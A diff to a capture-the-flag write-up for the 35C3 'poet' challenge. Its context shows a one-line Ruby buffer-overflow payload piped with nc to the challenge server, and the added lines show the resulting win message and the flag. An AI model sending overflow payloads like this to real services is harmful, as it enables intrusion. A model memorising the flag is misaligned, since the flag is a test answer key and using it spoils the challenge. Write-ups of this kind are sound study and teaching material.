@@ -1,4 +1,4 @@
-#poet#
+# poet
 
 > Solves: 214
 
@@ -74,3 +74,29 @@ This is as simple as executing:
 ruby -e 'puts; puts ?a * 0x40 + [0x40, 0x42, 0xf].pack("c*")' | nc 35.207.132.47 22223
 ```
 
+```
+**********************************************************
+* We are searching for the poet of the year 2018.        *
+* Submit your one line poem now to win an amazing prize! *
+**********************************************************
+
+Enter the poem here:
+> Who is the author of this poem?
+>
++---------------------------------------------------------------------------+
+THE POEM
+
+SCORED 1000000 POINTS.
+
+CONGRATULATIONS
+
+THE POET
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+RECEIVES THE AWARD FOR POET OF THE YEAR 2018!
+
+THE PRIZE IS THE FOLLOWING FLAG:
+35C3_f08b903f48608a14cbfbf73c08d7bdd731a87d39
+
++---------------------------------------------------------------------------+
+```
